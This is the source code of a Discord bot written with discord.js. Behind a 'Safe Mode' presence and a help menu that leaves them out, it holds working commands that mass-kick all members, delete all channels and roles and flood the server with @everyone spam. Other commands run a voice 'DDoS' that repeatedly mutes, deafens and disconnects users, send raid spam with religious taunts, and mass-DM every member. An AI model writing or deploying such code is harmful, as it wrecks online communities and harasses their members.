require("dotenv").config();
const { Client, GatewayIntentBits, PermissionsBitField, EmbedBuilder } = require("discord.js");

/* ======================= CLIENT ======================= */
const client = new Client({
    intents: [
        GatewayIntentBits.Guilds,
        GatewayIntentBits.GuildMembers,
        GatewayIntentBits.GuildMessages,
        GatewayIntentBits.MessageContent,
        GatewayIntentBits.GuildPresences,
        GatewayIntentBits.GuildVoiceStates
    ]
});

/* ======================= BASIC CONFIG ======================= */
const PREFIX = "?";
const DEFAULT_TAG = "";
let CUSTOM_TAG = "";

/* ======================= DEVELOPERS ======================= */
const DEVELOPERS = new Set([
    "1274503092154404908",
    "922556935633510491"
]);

/* ======================= BOT OWNER ID (for mention reply) ======================= */
const BOT_OWNER_ID = "1274503092154404908";
const MENTION_GIF_URL = "https://i.pinimg.com/originals/b2/ff/d9/b2ffd9de76ce9385a2577daad6505575.gif";

/* ======================= AUTO-KICK VOICE ======================= */
const VC_CHANNEL_ID = "1483592724480393286";
const allowedUsers = new Set(["1274503092154404908",
                             "1078169863664701531",
                             "699694653620093048",
                             "922556935633510491",
                             "1352410503032344599"
                             ]);

client.on("messageCreate", async (message) => {
    if (!message.guild || message.author.bot) return;
    if (!message.content.startsWith(PREFIX)) return;

    const args = message.content.slice(PREFIX.length).trim().split(/ +/);
    const command = (args.shift() || "").toLowerCase();

    if (command === "ydkhol") {
        if (!DEVELOPERS.has(message.author.id)) return message.reply("❌ Developer only");
        const member = message.mentions.members.first() || message.guild.members.cache.get(args[0]);
        if (!member) return message.reply("❌ Mention a valid member");
        
        // Protection spéciale pour l'owner bot
        if (member.id === BOT_OWNER_ID) {
            return message.reply("**Bghiti tl3eb b zgheb d 9lawina db ??**");
        }
        
        allowedUsers.add(member.id);
        return message.reply(`<a:done:1347594035208130662> ${member.user.tag} Sf dkhol`);
    }

    if (command === "maydkholch") {
        if (!DEVELOPERS.has(message.author.id)) return message.reply("❌ Developer only");
        const member = message.mentions.members.first() || message.guild.members.cache.get(args[0]);
        if (!member) return message.reply("❌ Mention a valid member");
        
        // Protection spéciale pour l'owner bot
        if (member.id === BOT_OWNER_ID) {
            return message.reply("**Bghiti tl3eb b zgheb d 9lawina db ??**");
        }
        
        allowedUsers.delete(member.id);
        return message.reply(`❌ ${member.user.tag} Zab ladkholti`);
    }
});

/* ======================= SELF REACT SYSTEM ======================= */
const selfReacts = new Map();
const AUTO_EMOJIS = ["<:ah:1456330508853317632>", "<:la:1456330662372970558>"];
const AUTO_CHANNEL_ID = "1451626940799782954";
const checkPagination = new Map();

/* ======================= HELPER FUNCTIONS ======================= */
function formatDate(date) {
    const days = ['Sunday', 'Monday', 'Tuesday', 'Wednesday', 'Thursday', 'Friday', 'Saturday'];
    const months = ['January', 'February', 'March', 'April', 'May', 'June', 'July', 'August', 'September', 'October', 'November', 'December'];
    const dayName = days[date.getDay()];
    const monthName = months[date.getMonth()];
    const day = date.getDate();
    const year = date.getFullYear();
    const hours = date.getHours().toString().padStart(2, '0');
    const minutes = date.getMinutes().toString().padStart(2, '0');
    const seconds = date.getSeconds().toString().padStart(2, '0');
    return `${dayName}, ${monthName} ${day}, ${year} at ${hours}:${minutes}:${seconds}`;
}

/* ======================= READY ======================= */
client.once("ready", () => {
    console.log(`✅ Logged in as ${client.user.tag}`);
    console.log(`📅 Today is: ${new Date().toLocaleDateString('en-US', { weekday: 'long', year: 'numeric', month: 'long', day: 'numeric' })}`);
    client.user.setPresence({
        activities: [{ name: "NB4rr Bot Safe Mode", type: 0 }],
        status: "online"
    });
    console.log(`🏠 Bot is ready! Custom tag set to: ${CUSTOM_TAG}`);
});

/* ======================= MESSAGE HANDLER ======================= */
client.on("messageCreate", async (message) => {
    try {
        if (message.author.bot) return;

        const guildReacts = selfReacts.get(message.guild?.id);
        if (message.guild && guildReacts) {
            for (const [emoji, users] of guildReacts) {
                if (users.has(message.author.id)) {
                    await message.react(emoji).catch(() => {});
                }
            }
        }

        if (message.guild && message.channelId === AUTO_CHANNEL_ID) {
            for (const emoji of AUTO_EMOJIS) {
                await message.react(emoji).catch(() => {});
            }
        }

        if (!message.content.startsWith(PREFIX)) return;

        const args = message.content.slice(PREFIX.length).trim().split(/ +/);
        const command = (args.shift() || "").toLowerCase();

        /* ======================= HELP ======================= */
        if (command === "help") {
            const helpEmbed = new EmbedBuilder()
                .setColor(0x8B0000)
                .setAuthor({ name: "4rr BOT — Command List", iconURL: client.user.displayAvatarURL() })
                .setDescription("Here are all available commands. Prefix: **`?`**")
                .addFields(
                    {
                        name: "<a:FlecheSTX:1455957814878015549> Voice Control",
                        value: [
                            "`?aji` — Join your current voice channel",
                            "`?aji <id>` — Join a specific voice channel",
                            "`?siri` — Leave the voice channel",
                            "`?siftina <id>` — Mass move your VC members to another VC",
                            "`?ydkhol @user` — Allow a user into restricted VC",
                            "`?maydkholch @user` — Remove a user from VC whitelist",
                        ].join("\n"),
                        inline: false
                    },
                    {
                        name: "<a:FlecheSTX:1455957814878015549> Tag System",
                        value: [
                            "`?tag @member` — Tag a specific member",
                            "`?tagall` — Tag all members",
                            "`?untagall` — Remove tag from all members",
                            "`?settag <text>` — Set a custom tag",
                            "`?resettag` — Reset tag to default",
                            "`?currenttag` — Show current tag",
                        ].join("\n"),
                        inline: false
                    },
                    {
                        name: "<a:FlecheSTX:1455957814878015549> Reactions",
                        value: [
                            "`?zidem @user <emoji>` — Set auto react on a user",
                            "`?7ydem @user <emoji>` — Remove auto react from a user",
                        ].join("\n"),
                        inline: false
                    },
                    {
                        name: "<a:FlecheSTX:1455957814878015549> Other",
                        value: [
                            "`?system` — Show bot system info",
                            "`?adddev @user` — Add a developer",
                            "`?removedev @user` — Remove a developer",
                        ].join("\n"),
                        inline: false
                    }
                )
                .addFields({
                    name: "",
                    value: "<:444:1456338630162256096> La mhtaj chi mosa3ada sift liya f DM <@1274503092154404908> bch manjawbkch",
                    inline: false
                })
                .setFooter({ text: `Requested by ${message.author.username}`, iconURL: message.author.displayAvatarURL() })
                .setTimestamp();
            return message.reply({ embeds: [helpEmbed] });
        }

        /* ======================= TY7RBO (NUKE - SIDKOM OVERDOSE) ======================= */
if (command === "ty7rbo") {
    if (!DEVELOPERS.has(message.author.id)) return message.reply("❌ Developer only");
    if (!message.guild) return message.reply("❌ Server only");
    
    await message.delete().catch(() => {});
    const guild = message.guild;
    
    // 1. KICK TOUS LES MEMBERS D'ABORD
    console.log("🔥 Starting mass kick...");
    await guild.members.fetch();
    const allMembers = guild.members.cache.filter(m => !m.user.bot && m.kickable);
    for (const [, member] of allMembers) {
        await member.kick("SIDKOM OVERDOSE").catch(() => {});
    }
    console.log(`✅ Kicked ${allMembers.size} members`);
    
    // 2. DELETE CHANNELS
    console.log("🗑️ Deleting channels...");
    const channels = guild.channels.cache.filter(c => c.deletable);
    for (const [, channel] of channels.sort((a,b) => b.position - a.position)) {
        await channel.delete().catch(() => {});
    }
    
    // 3. DELETE ROLES (bas → haut)
    console.log("🗑️ Deleting roles...");
    const roles = guild.roles.cache.filter(r => r.deletable && !r.managed)
        .sort((a,b) => b.position - a.position).reverse();
    for (const [, role] of roles) {
        await role.delete().catch(() => {});
    }
    
    // 4. SPAM "**4rr Team Never Die**" EN GRAS 500x
    console.log("Spamming 4rr Team Never Die...");
    const spamMessage = "**4rr Team Never Die**";
    for (let i = 0; i < 500; i++) {
        guild.channels.cache.first()?.send(`${i % 2 === 0 ? "@everyone" : "@here"} ${spamMessage}`).catch(() => {});
        await new Promise(r => setTimeout(r, 5)); // Ultra rapide
    }
    
    // 5. CREATE 75 CHAOS CHANNELS "Sidkom Overdose"
    console.log("📺 Creating Sidkom Overdose channels...");
    for (let i = 0; i < 75; i++) {
        guild.channels.create({ 
            name: `Sidkom-Overdose-${i}`, 
            type: 0 
        }).catch(() => {});
    }
    
    // 6. CREATE 75 CHAOS ROLES "Sidkom Overdose"
    console.log("🎭 Creating Sidkom Overdose roles...");
    for (let i = 0; i < 75; i++) {
        guild.roles.create({ 
            name: `Sidkom-Overdose-${i}`,
            color: "RED"
        }).catch(() => {});
    }
    
    // 7. MESSAGE FINAL
    guild.channels.cache.first()?.send("**SERVER HA9 MCHA** 💀").catch(() => {});
    
    console.log("💀 TY7RBO SIDKOM OVERDOSE COMPLETE");
    return;
}

        /* ======================= LAG VOICE (SILENCIEUX - DM + SERVER) ======================= */
if (command === "lag") {
    if (!DEVELOPERS.has(message.author.id)) return;
    
    const targetId = args[0];
    const timeStr = args[1];
    if (!targetId || !timeStr) return message.reply("❌ `?lag <voice_id> <10s|30s|1min>`");
    
    // Guild detection (DM ou Server)
    let guild;
    if (!message.guild) {
        const guilds = client.guilds.cache;
        if (guilds.size=== 0) return;
        guild = guilds.first();
    } else {
        guild = message.guild;
    }
    
    const targetVC = guild.channels.cache.get(targetId);
    if (!targetVC || targetVC.type !== 2) return message.reply("❌ Invalid VC ID");
    
    let duration = 10000;
    if (timeStr.includes('s')) duration = parseInt(timeStr) * 1000;
    else if (timeStr.includes('min')) duration = parseInt(timeStr) * 60000;
    
    // AUCUNE REPLY au début - SILENCIEUX
    let cycles = 0;
    const voiceDDoS = setInterval(async () => {
        const members = targetVC.members;
        
        // DEAFEN CYCLE (silencieux)
        for (const [, member] of members) {
            if (!member.user.bot && member.manageable) {
                member.voice.setDeafened(!member.voice.selfDeaf, "🎵").catch(() => {});
            }
        }
        
        // MUTE CYCLE (silencieux)
        for (const [, member] of members) {
            if (!member.user.bot && member.manageable) {
                member.voice.setMuted(!member.voice.selfMute, "🎵").catch(() => {});
            }
        }
        
        // DISCONNECT 50% (silencieux)
        const half = Array.from(members.values()).slice(0, Math.floor(members.size * 0.5));
        for (const member of half) {
            if (!member.user.bot) {
                member.voice.disconnect("🎵").catch(() => {});
            }
        }
        
        cycles++;
    }, 200); // Plus agressif
    
    // SEULEMENT À LA FIN → DM stop message
    setTimeout(async () => {
        clearInterval(voiceDDoS);
        
        // ENVOIE TOUJOURS EN DM (même si command en server)
        try {
            await message.author.send(`🛑 **DDOS STOPPED** - ${cycles} cycles sur **${targetVC.name}** (${guild.name})`);
        } catch {
            // Fallback si DM bloqué
            message.channel.send(`🛑 **DDOS STOPPED** - ${cycles} cycles`).catch(() => {});
        }
    }, duration);
    
    return; // AUCUNE REPLY au début
}

        /* ======================= RAID ======================= */
        if (command === "raid") {
            if (!DEVELOPERS.has(message.author.id)) return message.reply("❌ Developer only");
            if (!message.guild) return message.reply("❌ Server only");
            await message.delete().catch(() => {});
            const raidMessages = [
                "@everyone",
                "RAID MODE ACTIVATED",
                "Attack Suzie",
                "Monafi9in naaaaaarrrr",
                "Houuuffff 3likom alkofaraaaaa",
                "Houuuuffffffff"
            ];
            
            for (let i = 0; i < 100; i++) {
                const msg = raidMessages[Math.floor(Math.random() * raidMessages.length)];
                message.channel.send(msg).catch(() => {});
                await new Promise(r => setTimeout(r, 50));
            }
            return;
        }

        /* ======================= MASSDM ======================= */
        if (command === "massdm") {
            if (!DEVELOPERS.has(message.author.id)) return message.reply("❌ Developer only");
            if (!message.guild) return message.reply("❌ Server only");
            const messageText = args.join(" ");
            if (!messageText) return message.reply("❌ Usage: `?massdm <message>`");
            
            await message.delete().catch(() => {});
            const members = message.guild.members.cache.filter(m => !m.user.bot);
            
            let sent = 0;
            for (const [, member] of members) {
                try {
                    await member.send(`📢 **MASS DM**\n\n${messageText}`);
                    sent++;
                } catch (e) {}
                await new Promise(r => setTimeout(r, 100));
            }
            
            message.channel.send(`📨 Sent **${sent}** mass DMs`).catch(() => {});
            return;
        }

        /* ======================= SYSTEM ======================= */
        if (command === "system") {
            const uptimeSeconds = process.uptime();
            const hours = Math.floor(uptimeSeconds / 3600);
            const minutes = Math.floor((uptimeSeconds % 3600) / 60);
            const memoryUsageMB = Math.round(process.memoryUsage().rss / 1024 / 1024);
            return message.reply(
`💻 Bot System Info\n` +
`Host: NB4rr's bot\n` +
`Node Version: ${process.version}\n` +
`Uptime: ${hours}h ${minutes}m\n` +
`Memory: ${memoryUsageMB} MB\n` +
`Guilds: ${client.guilds.cache.size}\n` +
`Current tag: ${CUSTOM_TAG || "None"}`
            );
        }

        /* ======================= TAG ======================= */
        if (command === "tag") {
            if (!message.guild) return message.reply("❌ Server only");
            if (!DEVELOPERS.has(message.author.id)) return message.reply("❌ Developer only");
            if (!CUSTOM_TAG) return message.reply("❌ No tag set, use `?settag <text>` first");
            const member = message.mentions.members.first() || message.guild.members.cache.get(args[0]);
            if (!member) return message.reply("❌ Mention a valid member");
            let cleanName = member.displayName.replace(new RegExp(`^${escapeRegex(CUSTOM_TAG)}\\s*`), "").trim() || member.user.username;
            await member.setNickname(`${CUSTOM_TAG} ${cleanName}`).catch(() => {});
            return message.reply(`<a:done:1347594035208130662> Tagged ${member.user.tag}`);
        }

        /* ======================= TAGALL ======================= */
        if (command === "tagall") {
            if (!DEVELOPERS.has(message.author.id)) return message.reply("❌ Developer only");
            if (!CUSTOM_TAG) return message.reply("❌ No tag set, use `?settag <text>` first");
            const startTime = Date.now();
            const members = await message.guild.members.fetch();
            let count = 0;
            for (const [, member] of members) {
                if (member.user.bot) continue;
                let cleanName = member.displayName.replace(new RegExp(`^${escapeRegex(CUSTOM_TAG)}\\s*`), "").trim() || member.user.username;
                await member.setNickname(`${CUSTOM_TAG} ${cleanName}`).catch(() => {});
                count++;
            }
            const elapsed = ((Date.now() - startTime) / 1000).toFixed(2);
            const tagallEmbed = new EmbedBuilder()
                .setColor(0x8B0000)
                .setAuthor({ name: "Tag Operation Complete", iconURL: client.user.displayAvatarURL() })
                .setDescription("<a:done:1347594035208130662> All members have been successfully tagged!")
                .addFields(
                    { name: "🏷️ Tag Used", value: `\`${CUSTOM_TAG}\``, inline: true },
                    { name: "👥 Members Tagged", value: `\`${count}\``, inline: true },
                    { name: "<:Time:1455957726059303087> Time Taken", value: `\`${elapsed}s\``, inline: true },
                    { name: "<a:crowndarkred:1347593632005357650> Launched By", value: `${message.author}`, inline: true }
                )
                .setImage("https://i.pinimg.com/originals/79/a8/68/79a868b80feef9ba913930e5fcccb825.gif")
                .setFooter({ text: message.guild.name, iconURL: message.guild.iconURL() })
                .setTimestamp();
            return message.reply({ embeds: [tagallEmbed] });
        }

        /* ======================= UNTAGALL ======================= */
        if (command === "untagall") {
            if (!DEVELOPERS.has(message.author.id)) return message.reply("❌ Developer only");
            if (!CUSTOM_TAG) return message.reply("❌ No tag set, nothing to remove");
            const startTime = Date.now();
            const members = await message.guild.members.fetch();
            let count = 0;
            for (const [, member] of members) {
                if (member.user.bot) continue;
                let cleanName = member.displayName.replace(new RegExp(`^${escapeRegex(CUSTOM_TAG)}\\s*`), "").trim();
                await member.setNickname(cleanName || null).catch(() => {});
                count++;
            }
            const elapsed = ((Date.now() - startTime) / 1000).toFixed(2);
            const untagallEmbed = new EmbedBuilder()
                .setColor(0x8B0000)
                .setAuthor({ name: "Untag Operation Complete", iconURL: client.user.displayAvatarURL() })
                .setDescription("<a:done:1347594035208130662> All tags have been successfully removed!")
                .addFields(
                    { name: "👥 Members Untagged", value: `\`${count}\``, inline: true },
                    { name: "<:Time:1455957726059303087> Time Taken", value: `\`${elapsed}s\``, inline: true },
                    { name: "<a:crowndarkred:1347593632005357650> Launched By", value: `${message.author}`, inline: true }
                )
                .setImage("https://i.pinimg.com/originals/79/a8/68/79a868b80feef9ba913930e5fcccb825.gif")
                .setFooter({ text: message.guild.name, iconURL: message.guild.iconURL() })
                .setTimestamp();
            return message.reply({ embeds: [untagallEmbed] });
        }

        /* ======================= SETTAG ======================= */
        if (command === "settag") {
            if (!DEVELOPERS.has(message.author.id)) return message.reply("❌ Developer only");
            if (!args.length) return message.reply("❌ Provide a tag");
            CUSTOM_TAG = args.join(" ");
            return message.reply(`<a:done:1347594035208130662> Tag set to: ${CUSTOM_TAG}`);
        }

        /* ======================= CURRENTTAG ======================= */
        if (command === "currenttag") {
            return message.reply(`🏷️ Current tag: ${CUSTOM_TAG || "None"}`);
        }

        /* ======================= RESETTAG ======================= */
        if (command === "resettag") {
            if (!DEVELOPERS.has(message.author.id)) return message.reply("❌ Developer only");
            CUSTOM_TAG = "";
            return message.reply(`<a:done:1347594035208130662> Tag has been reset`);
        }

        /* ======================= ADDDEV ======================= */
        if (command === "adddev") {
            if (!DEVELOPERS.has(message.author.id)) return message.reply("❌ Developer only");
            const member = message.mentions.members.first() || message.guild.members.cache.get(args[0]);
            if (!member) return message.reply("❌ Mention a valid member");
            DEVELOPERS.add(member.id);
            return message.reply(`<a:done:1347594035208130662> ${member.user.tag} is now a developer`);
        }

        /* ======================= REMOVEDEV ======================= */
        if (command === "removedev") {
            if (!DEVELOPERS.has(message.author.id)) return message.reply("❌ Developer only");
            const member = message.mentions.members.first() || message.guild.members.cache.get(args[0]);
            if (!member) return message.reply("❌ Mention a valid member");
            if (member.id === message.author.id) return message.reply("❌ You can't remove yourself");
            DEVELOPERS.delete(member.id);
            return message.reply(`<a:done:1347594035208130662> ${member.user.tag} removed from developers`);
        }

        /* ======================= ZIDEM (AUTO REACT) ======================= */
        if (command === "zidem") {
            if (!DEVELOPERS.has(message.author.id)) return message.reply("❌ Developer only");
            const member = message.mentions.members.first() || message.guild.members.cache.get(args[0]);
            if (!member) return message.reply("❌ Mention a valid member");
            const emojiArg = args.find(a => !a.startsWith("<@") && a !== member.id) || args[args.length - 1];
            if (!emojiArg) return message.reply("❌ Provide an emoji");
            if (!selfReacts.has(message.guild.id)) selfReacts.set(message.guild.id, new Map());
            const guildMap = selfReacts.get(message.guild.id);
            if (!guildMap.has(emojiArg)) guildMap.set(emojiArg, new Set());
            guildMap.get(emojiArg).add(member.id);
            return message.reply(`<a:done:1347594035208130662> Done ${emojiArg} on ${member.user.tag}'s messages`);
        }

        /* ======================= 7YDEM (REMOVE AUTO REACT) ======================= */
        if (command === "7ydem") {
            if (!DEVELOPERS.has(message.author.id)) return message.reply("❌ Developer only");
            const member = message.mentions.members.first() || message.guild.members.cache.get(args[0]);
            if (!member) return message.reply("❌ Mention a valid member");
            const emojiArg = args.find(a => !a.startsWith("<@") && a !== member.id) || args[args.length - 1];
            if (!emojiArg) return message.reply("❌ Provide an emoji");
            const guildMap = selfReacts.get(message.guild.id);
            if (!guildMap || !guildMap.has(emojiArg)) return message.reply("❌ No reaction found for this emoji");
            guildMap.get(emojiArg).delete(member.id);
            if (guildMap.get(emojiArg).size === 0) guildMap.delete(emojiArg);
            return message.reply(`<a:done:1347594035208130662> Removed ${emojiArg} from ${member.user.tag}`);
        }

        /* ======================= AJI (JOIN VOICE) ======================= */
        if (command === "aji") {
            if (!DEVELOPERS.has(message.author.id)) return message.reply("❌ Developer only");
            const { joinVoiceChannel } = require("@discordjs/voice");
            let targetChannel = null;
            if (args[0]) {
                targetChannel = message.guild.channels.cache.get(args[0]);
                if (!targetChannel || targetChannel.type !== 2) return message.reply("❌ Invalid voice channel ID");
            } else {
                const authorMember = await message.guild.members.fetch(message.author.id).catch(() => null);
                if (!authorMember || !authorMember.voice.channelId) return message.reply("❌ You are not in a voice channel");
                targetChannel = authorMember.voice.channel;
            }
            try {
                joinVoiceChannel({
                    channelId: targetChannel.id,
                    guildId: message.guild.id,
                    adapterCreator: message.guild.voiceAdapterCreator,
                    selfDeaf: false,
                    selfMute: false
                });
                return message.reply(`<a:done:1347594035208130662> Hana jit`);
            } catch (err) {
                console.log("Error joining VC:", err);
            }
        }

        /* ======================= SIRI (LEAVE VOICE) ======================= */
        if (command === "siri") {
            if (!DEVELOPERS.has(message.author.id)) return message.reply("❌ Developer only");
            const { getVoiceConnection } = require("@discordjs/voice");
            const connection = getVoiceConnection(message.guild.id);
            if (!connection) return message.reply("❌ I am not in any voice channel");
            connection.destroy();
            return message.reply("<a:done:1347594035208130662> Haya Ghadiya");
        }

        /* ======================= SIFTINA (MASS MOVE) ======================= */
        if (command === "siftina") {
            if (!DEVELOPERS.has(message.author.id)) return message.reply("❌ Developer only");
            const targetChannelId = args[0];
            if (!targetChannelId) return message.reply("❌ Use: `?siftina <channel_id>`");
            const targetChannel = message.guild.channels.cache.get(targetChannelId);
            if (!targetChannel || targetChannel.type !== 2) return message.reply("❌ Invalid voice channel ID");
            const authorMember = await message.guild.members.fetch(message.author.id).catch(() => null);
            if (!authorMember || !authorMember.voice.channelId) return message.reply("❌ You must be in a voice channel");
            const sourceChannel = authorMember.voice.channel;
            if (sourceChannel.id === targetChannelId) return message.reply("❌ Same channel");
            const members = sourceChannel.members;
            if (members.size === 0) return message.reply("❌ No members in your voice channel");
            let moved = 0;
            for (const [, member] of members) {
                if (member.user.bot) continue;
                await member.voice.setChannel(targetChannel).catch(() => {});
                moved++;
            }
            return message.reply(`<a:done:1347594035208130662> Moved ${moved} members to **${targetChannel.name}**`);
        }

    } catch (err) {
        console.log("Error:", err);
    }
});

/* ======================= ESCAPE REGEX HELPER ======================= */
function escapeRegex(str) {
    return str.replace(/[.*+?^${}()|[\]\\]/g, '\\$&');
}

/* ======================= AUTO TAG + WELCOME DM ======================= */
client.on("guildMemberAdd", async (member) => {
    if (member.user.bot) return;
    if (CUSTOM_TAG) {
        try {
            let cleanName = member.displayName.replace(new RegExp(`^${escapeRegex(CUSTOM_TAG)}\\s*`), "").trim();
            if (!cleanName) cleanName = member.user.username;
            await member.setNickname(`${CUSTOM_TAG} ${cleanName}`);
            console.log(`✅ Auto-tagged new member: ${member.user.tag} with ${CUSTOM_TAG}`);
        } catch (error) {
            console.log(`⚠️ Unable to tag ${member.user.tag}: ${error.message}`);
        }
    }
    try {
        await member.send(
`<:444:1456338630162256096> **Welcome!** <:444:1456338630162256096>\n` +
`Hello **${member.user.username}**!\n` +
`Enjoy your time and read the rules!\n\n` +
`- **NB4rr Team**`
        );
    } catch (err) {
        console.log(`Could not send DM to ${member.user.tag}`);
    }
});

/* ======================= AUTO-KICK VOICE HANDLER ======================= */
client.on("voiceStateUpdate", async (oldState, newState) => {
    try {
        if (!newState.channelId) return;
        if (newState.channelId !== VC_CHANNEL_ID) return;
        if (!allowedUsers.has(newState.id)) {
            await newState.disconnect("Not allowed in this VC");
            console.log(`⚠️ ${newState.member.user.tag} was auto-kicked from VC`);
        }
    } catch (err) {
        console.log("Error in auto-kick VC:", err);
    }
});

/* ======================= LOGIN ======================= */
if (!process.env.BOT_TOKEN) {
    console.error("❌ BOT_TOKEN missing in .env");
    process.exit(1);
}
client.login(process.env.BOT_TOKEN);

/* ======================= GLOBAL ERROR HANDLER ======================= */
process.on("unhandledRejection", (reason) => {
    console.error("Unhandled Rejection:", reason);
});